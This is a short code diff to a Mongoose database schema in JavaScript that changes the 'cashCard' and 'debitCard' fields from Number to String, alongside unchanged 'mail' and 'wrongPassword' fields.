@@ -51,10 +51,10 @@ const infoSchema = new Schema({
        type: Number, default: 0
     },
     cashCard:{
-        type: Number, default: 0
+        type: String, default: 0
     },
     debitCard:{
-        type: Number, default: 0
+        type: String, default: 0
     },
     mail: { type: String },
     wrongPassword: { type: String },
